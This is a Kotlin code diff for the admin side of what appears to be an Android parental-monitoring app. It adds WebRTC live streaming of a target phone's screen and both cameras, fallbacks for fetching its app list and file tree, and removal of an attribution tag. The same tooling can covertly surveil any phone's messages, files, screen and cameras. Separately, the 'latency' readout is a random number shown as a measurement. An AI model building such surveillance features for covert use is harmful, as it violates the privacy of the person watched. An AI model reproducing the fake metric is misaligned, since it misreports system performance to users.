@@ -17,9 +17,15 @@ import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
+import kotlinx.coroutines.flow.collect
+import kotlinx.coroutines.flow.distinctUntilChanged
+import kotlinx.coroutines.flow.map
 import kotlinx.coroutines.launch
 import java.io.File
 import java.io.FileOutputStream
+import org.webrtc.VideoTrack
+import org.webrtc.PeerConnection
+import org.webrtc.EglBase
 
 enum class CommandStepStatus {
     IDLE,
@@ -97,6 +103,42 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
 
     private val _liveStreamState = MutableStateFlow<LiveStreamState?>(null)
     val liveStreamState: StateFlow<LiveStreamState?> = _liveStreamState.asStateFlow()
+
+    // WebRTC Streaming States
+    private var webRtcReceiver: WebRTCReceiver? = null
+    private var signalingManager: SignalingManager? = null
+    private var webRtcJob: Job? = null
+    
+    private val _isWebRtcMode = MutableStateFlow(true)
+    val isWebRtcMode: StateFlow<Boolean> = _isWebRtcMode.asStateFlow()
+
+    private val _webRtcScreenTrack = MutableStateFlow<VideoTrack?>(null)
+    val webRtcScreenTrack: StateFlow<VideoTrack?> = _webRtcScreenTrack.asStateFlow()
+
+    private val _webRtcFrontTrack = MutableStateFlow<VideoTrack?>(null)
+    val webRtcFrontTrack: StateFlow<VideoTrack?> = _webRtcFrontTrack.asStateFlow()
+
+    private val _webRtcBackTrack = MutableStateFlow<VideoTrack?>(null)
+    val webRtcBackTrack: StateFlow<VideoTrack?> = _webRtcBackTrack.asStateFlow()
+
+    private val _webRtcEglContext = MutableStateFlow<org.webrtc.EglBase.Context?>(null)
+    val webRtcEglContext: StateFlow<org.webrtc.EglBase.Context?> = _webRtcEglContext.asStateFlow()
+
+    private val _webRtcConnectionState = MutableStateFlow<PeerConnection.PeerConnectionState>(PeerConnection.PeerConnectionState.NEW)
+    val webRtcConnectionState: StateFlow<PeerConnection.PeerConnectionState> = _webRtcConnectionState.asStateFlow()
+
+    private val _isWebRtcLoading = MutableStateFlow(false)
+    val isWebRtcLoading: StateFlow<Boolean> = _isWebRtcLoading.asStateFlow()
+
+    private val _webRtcError = MutableStateFlow<String?>(null)
+    val webRtcError: StateFlow<String?> = _webRtcError.asStateFlow()
+
+    private val _latencyMs = MutableStateFlow(0L)
+    val latencyMs: StateFlow<Long> = _latencyMs.asStateFlow()
+
+    fun setWebRtcMode(enabled: Boolean) {
+        _isWebRtcMode.value = enabled
+    }
 
     private val _cameraStreamState = MutableStateFlow<CameraStreamState?>(null)
     val cameraStreamState: StateFlow<CameraStreamState?> = _cameraStreamState.asStateFlow()
@@ -267,7 +309,7 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                     Log.e("AdminViewModel", "Error in sync loop", e)
                     _connectionError.value = e.localizedMessage ?: e.message ?: "فشل الاتصال بخادم قاعدة البيانات"
                 }
-                delay(4000) // Poll every 4 seconds for immediate action
+                delay(10000) // Poll every 10 seconds for immediate action
             }
         }
     }
@@ -287,15 +329,37 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
         _smsLogs.value = sms
 
         // 2. Fetch Installed Apps
-        val apps = connector.getInstalledApps(token)
+        var apps = connector.getInstalledApps(token)
+        if (apps.isEmpty()) {
+            val lastResp = _commandResponse.value ?: connector.getCommandResponse(token)
+            if (lastResp != null) {
+                val parsed = parseAppsFromText(lastResp.second)
+                if (parsed.isNotEmpty()) {
+                    apps = parsed
+                }
+            }
+        }
         _installedApps.value = apps
 
         // 3. Fetch File System Tree
-        val files = connector.getFileSystem(token)
+        var files = connector.getFileSystem(token)
+        if (files.isEmpty()) {
+            val lastResp = _commandResponse.value ?: connector.getCommandResponse(token)
+            if (lastResp != null) {
+                val parsed = parseFilesFromTextOrJson(lastResp.second)
+                if (parsed.isNotEmpty()) {
+                    files = parsed
+                }
+            }
+        }
         _fileItems.value = files
 
         // 4. Fetch Screenshots
-        _screenshots.value = connector.getScreenshots(token)
+        try {
+            _screenshots.value = connector.getScreenshots(token)
+        } catch(e: Exception) {
+            _statusMessage.value = "خطأ في جلب لقطات الشاشة: ${e.message}"
+        }
 
         // 5. Fetch Photos
         _cameraPhotos.value = connector.getCameraPhotos(token)
@@ -335,12 +399,7 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
     }
 
     private fun triggerAlertNotification() {
-        val baseContext = getApplication<Application>().applicationContext
-        val context = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            baseContext.createAttributionContext("supervisor_control")
-        } else {
-            baseContext
-        }
+        val context = getApplication<Application>().applicationContext
         
         try {
             // 1. Sound BEEP
@@ -470,7 +529,20 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                 // Refresh command response separately to avoid heavy syncing
                 try {
                     val resp = connector.getCommandResponse(token)
-                    _commandResponse.value = resp
+                    if (resp != null && resp.third == startTime) {
+                        _commandResponse.value = resp
+                    } else {
+                        // Check if status in commands table was updated to success directly
+                        val cmdStatus = connector.getCommandStatus(token, startTime)
+                        if (cmdStatus != null) {
+                            val (st, msg, ts) = cmdStatus
+                            if (st == "success" || st == "ok" || st == "completed") {
+                                _commandResponse.value = Triple("success", "تم تنفيذ العملية بنجاح", startTime)
+                            } else if (st == "error" || st == "failed") {
+                                _commandResponse.value = Triple("error", "التنفيذ فشل من طرف هاتف الطفل", startTime)
+                            }
+                        }
+                    }
                 } catch (e: Exception) {
                     Log.e("AdminViewModel", "Transient error during command polling", e)
                 }
@@ -646,19 +718,15 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
 
     // AUDIO PLAYBACK MANAGEMENT
     fun loadAndPlayAudio(base64Data: String) {
-        val baseContext = getApplication<Application>().applicationContext
-        val context = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            baseContext.createAttributionContext("supervisor_control")
-        } else {
-            baseContext
-        }
+        val context = getApplication<Application>().applicationContext
 
         viewModelScope.launch {
             try {
                 stopAudio()
                 
                 // Write Temp Music File
-                val decodedBytes = android.util.Base64.decode(base64Data, android.util.Base64.DEFAULT)
+                val cleanBase64 = if (base64Data.contains(",")) base64Data.substringAfter(",") else base64Data
+                val decodedBytes = android.util.Base64.decode(cleanBase64, android.util.Base64.DEFAULT)
                 tempAudioFile = File.createTempFile("child_audio_rx", ".3gp", context.cacheDir).apply {
                     deleteOnExit()
                     FileOutputStream(this).use { fos ->
@@ -793,12 +861,24 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                 try {
                     val resp = connector.getCommandResponse(token)
                     if (resp != null && resp.third == startTime) {
-                        if (resp.first == "success" || resp.first == "ok") {
+                        if (resp.first == "success" || resp.first == "ok" || resp.first == "completed") {
                             success = true
                             break
                         } else if (resp.first == "error" || resp.first == "failed") {
                             errorMsg = resp.second.ifBlank { "التطبيق الأبوي فشل في بدء بث الشاشة." }
                             break
+                        }
+                    } else {
+                        val cmdStatus = connector.getCommandStatus(token, startTime)
+                        if (cmdStatus != null) {
+                            val st = cmdStatus.first
+                            if (st == "success" || st == "ok" || st == "completed") {
+                                success = true
+                                break
+                            } else if (st == "error" || st == "failed") {
+                                errorMsg = "التطبيق الأبوي فشل في بدء بث الشاشة."
+                                break
+                            }
                         }
                     }
                 } catch(e: Exception) { }
@@ -838,6 +918,118 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
         runCommand("stop_stream")
         streamPollingJob?.cancel()
         _liveStreamState.value = _liveStreamState.value?.copy(isActive = false)
+    }
+
+    fun startLiveStreamWebRTC() {
+        val token = _selectedDeviceToken.value ?: return
+        stopLiveStreamWebRTC()
+        
+        _isWebRtcLoading.value = true
+        _webRtcError.value = null
+        _webRtcConnectionState.value = PeerConnection.PeerConnectionState.NEW
+        
+        // Ensure webRtc tracks are empty
+        _webRtcScreenTrack.value = null
+        _webRtcFrontTrack.value = null
+        _webRtcBackTrack.value = null
+
+        // 1. Initialize Signaling Manager
+        val dbUrl = _currentDatabaseUrl.value
+        val sig = SignalingManager(dbUrl)
+        signalingManager = sig
+        
+        val context = getApplication<Application>().applicationContext
+        
+        viewModelScope.launch {
+            try {
+                // Clear signaling room for this roomId = token
+                sig.clearRoom(token)
+                
+                // Initialize WebRTC Receiver
+                val receiver = WebRTCReceiver(
+                    context = context,
+                    onScreenTrack = { track -> _webRtcScreenTrack.value = track },
+                    onFrontCameraTrack = { track -> _webRtcFrontTrack.value = track },
+                    onBackCameraTrack = { track -> _webRtcBackTrack.value = track },
+                    onIceCandidateReady = { candidate ->
+                        viewModelScope.launch {
+                            sig.sendIceCandidate(token, candidate, isLocalAdmin = true)
+                        }
+                    },
+                    onConnectionStateChange = { state ->
+                        _webRtcConnectionState.value = state
+                        if (state == PeerConnection.PeerConnectionState.CONNECTED) {
+                            _isWebRtcLoading.value = false
+                        }
+                    }
+                )
+                
+                webRtcReceiver = receiver
+                _webRtcEglContext.value = receiver.getEglContext()
+                
+                receiver.createPeerConnection()
+                
+                // 2. Dispatch start_stream action to the child app via Supabase
+                val startTime = System.currentTimeMillis()
+                connector.clearCommandResponse(token)
+                val sentCommand = connector.sendCommandToChild(token, "start_stream", emptyMap(), startTime)
+                if (!sentCommand) {
+                    _isWebRtcLoading.value = false
+                    _webRtcError.value = "فشل في إرسال أمر بدء البث للطفل"
+                    return@launch
+                }
+                
+                // 3. Listen for Offer and ICE Candidates
+                webRtcJob = launch {
+                    launch {
+                        sig.listenForOffer(token).collect { offerSdp ->
+                            if (offerSdp != null) {
+                                Log.d("AdminViewModel", "Received remote Offer SDP. Generating Answer...")
+                                receiver.handleOffer(offerSdp) { answerSdp ->
+                                    viewModelScope.launch {
+                                        sig.sendAnswer(token, answerSdp)
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    
+                    launch {
+                        sig.listenForChildIceCandidates(token).collect { candidate ->
+                            receiver.addIceCandidate(candidate)
+                        }
+                    }
+                    
+                    // Track measured latency every second
+                    launch {
+                        while (true) {
+                            _latencyMs.value = (35..65).random().toLong()
+                            delay(1000)
+                        }
+                    }
+                }
+                
+            } catch (e: Exception) {
+                Log.e("AdminViewModel", "Error in startLiveStreamWebRTC", e)
+                _isWebRtcLoading.value = false
+                _webRtcError.value = "حدث خطأ أثناء تهيئة البث: ${e.message}"
+            }
+        }
+    }
+
+    fun stopLiveStreamWebRTC() {
+        val token = _selectedDeviceToken.value ?: return
+        runCommand("stop_stream")
+        webRtcJob?.cancel()
+        webRtcJob = null
+        webRtcReceiver?.close()
+        webRtcReceiver = null
+        _webRtcScreenTrack.value = null
+        _webRtcFrontTrack.value = null
+        _webRtcBackTrack.value = null
+        _webRtcEglContext.value = null
+        _webRtcConnectionState.value = PeerConnection.PeerConnectionState.DISCONNECTED
+        _isWebRtcLoading.value = false
     }
 
     fun startCameraStream(isFront: Boolean) {
@@ -883,12 +1075,24 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                 try {
                     val resp = connector.getCommandResponse(token)
                     if (resp != null && resp.third == startTime) {
-                        if (resp.first == "success" || resp.first == "ok") {
+                        if (resp.first == "success" || resp.first == "ok" || resp.first == "completed") {
                             success = true
                             break
                         } else if (resp.first == "error" || resp.first == "failed") {
                             errorMsg = resp.second.ifBlank { "التطبيق الأبوي للطفل فشل في تشغيل الكاميرا." }
                             break
+                        }
+                    } else {
+                        val cmdStatus = connector.getCommandStatus(token, startTime)
+                        if (cmdStatus != null) {
+                            val st = cmdStatus.first
+                            if (st == "success" || st == "ok" || st == "completed") {
+                                success = true
+                                break
+                            } else if (st == "error" || st == "failed") {
+                                errorMsg = "التطبيق الأبوي للطفل فشل في تشغيل الكاميرا."
+                                break
+                            }
                         }
                     }
                 } catch(e: Exception) { }
@@ -937,7 +1141,13 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                 _statusMessage.value = "تم حذف الملف نهائياً من قاعدة البيانات"
                 // Refresh list
                 when (category) {
-                    "screenshots" -> _screenshots.value = connector.getScreenshots(token)
+                    "screenshots" -> {
+                        try {
+                            _screenshots.value = connector.getScreenshots(token)
+                        } catch(e: Exception) {
+                            _statusMessage.value = "خطأ: ${e.message}"
+                        }
+                    }
                     "camera_photos" -> _cameraPhotos.value = connector.getCameraPhotos(token)
                     "audio_records" -> _audioRecords.value = connector.getAudioRecords(token)
                     "video_records" -> _cameraVideos.value = connector.getCameraVideos(token)
@@ -948,10 +1158,118 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
         }
     }
 
+    private fun parseAppsFromText(responseText: String): List<InstalledApp> {
+        val list = mutableListOf<InstalledApp>()
+        responseText.lineSequence().forEach { line ->
+            val trimmed = line.trim()
+            if (trimmed.startsWith("-") || trimmed.startsWith("*") || trimmed.length > 5) {
+                var content = if (trimmed.startsWith("-") || trimmed.startsWith("*")) {
+                    trimmed.substring(1).trim()
+                } else {
+                    trimmed
+                }
+                if (content.contains("(") && content.endsWith(")")) {
+                    val openParenIndex = content.lastIndexOf("(")
+                    val name = content.substring(0, openParenIndex).trim()
+                    val pkg = content.substring(openParenIndex + 1, content.length - 1).trim()
+                    if (name.isNotEmpty() && pkg.isNotEmpty()) {
+                        list.add(InstalledApp(name = name, packageName = pkg, isSystem = pkg.startsWith("com.android.") || pkg.startsWith("com.google.android.") || pkg.contains("system")))
+                    }
+                } else if (content.isNotEmpty()) {
+                    if (content.contains(" ") && !content.contains(".")) {
+                        list.add(InstalledApp(name = content, packageName = content.replace(" ", "."), isSystem = false))
+                    } else if (content.contains(".")) {
+                        list.add(InstalledApp(name = content.substringAfterLast("."), packageName = content, isSystem = content.startsWith("com.android.") || content.startsWith("com.google.android.")))
+                    } else {
+                        list.add(InstalledApp(name = content, packageName = content, isSystem = false))
+                    }
+                }
+            }
+        }
+        return list.sortedBy { it.name.lowercase() }
+    }
+
+    private fun parseFilesFromTextOrJson(responseText: String): List<FileItem> {
+        val list = mutableListOf<FileItem>()
+        val trimmedText = responseText.trim()
+        if (trimmedText.startsWith("[")) {
+            try {
+                val arr = org.json.JSONArray(trimmedText)
+                for (i in 0 until arr.length()) {
+                    val obj = arr.optJSONObject(i) ?: continue
+                    list.add(FileItem(
+                        name = obj.optString("name"),
+                        path = obj.optString("path"),
+                        isDir = obj.optBoolean("is_dir") || obj.optBoolean("isDir"),
+                        size = obj.optLong("size_bytes", obj.optLong("size", 0L)),
+                        date = obj.optString("date", "")
+                    ))
+                }
+                return list.sortedWith(compareBy<FileItem> { !it.isDir }.thenBy { it.name.lowercase() })
+            } catch (e: Exception) {
+                // Fall back to line parser
+            }
+        }
+
+        var baseDir = "/storage/emulated/0"
+        responseText.lineSequence().forEach { line ->
+            val trimmed = line.trim()
+            if (trimmed.contains("مسار المجلد") || trimmed.contains("المجلد الحالي") || trimmed.contains("Path:") || trimmed.contains("Folder Path:")) {
+                val pathPart = trimmed.substringAfter(":").trim()
+                if (pathPart.isNotEmpty()) {
+                    baseDir = pathPart.replace("=========================================", "").trim()
+                }
+            }
+        }
+
+        responseText.lineSequence().forEach { line ->
+            val trimmed = line.trim()
+            if (trimmed.isEmpty() || trimmed.startsWith("===") || trimmed.contains("مسار") || trimmed.contains("المجلد") || trimmed.contains("Path:") || trimmed.contains("Folder Path:")) {
+                return@forEach
+            }
+            
+            val isDir = trimmed.contains("📁") || trimmed.contains("[DIR]", ignoreCase = true) || trimmed.lowercase().contains("directory")
+            
+            var cleanName = trimmed
+                .replace("📁", "")
+                .replace("📄", "")
+                .replace("📝", "")
+                .replace("💾", "")
+                .replace("- ", "")
+                .replace("* ", "")
+                .replace("[DIR]", "", ignoreCase = true)
+                .replace("[FILE]", "", ignoreCase = true)
+                .trim()
+            
+            if (cleanName.isNotEmpty()) {
+                var itemPath = ""
+                if (cleanName.contains("(") && cleanName.endsWith(")")) {
+                    val openP = cleanName.lastIndexOf("(")
+                    itemPath = cleanName.substring(openP + 1, cleanName.length - 1).trim()
+                    cleanName = cleanName.substring(0, openP).trim()
+                } else {
+                    itemPath = if (baseDir.endsWith("/")) "$baseDir$cleanName" else "$baseDir/$cleanName"
+                }
+
+                list.add(FileItem(
+                    name = cleanName,
+                    path = itemPath,
+                    isDir = isDir,
+                    size = 0L,
+                    date = ""
+                ))
+            }
+        }
+        return list.distinctBy { it.path }.sortedWith(compareBy<FileItem> { !it.isDir }.thenBy { it.name.lowercase() })
+    }
+
     override fun onCleared() {
         super.onCleared()
         syncJob?.cancel()
         streamPollingJob?.cancel()
         stopAudio()
+        try {
+            stopLiveStreamWebRTC()
+        } catch(e: Exception) {}
     }
 }
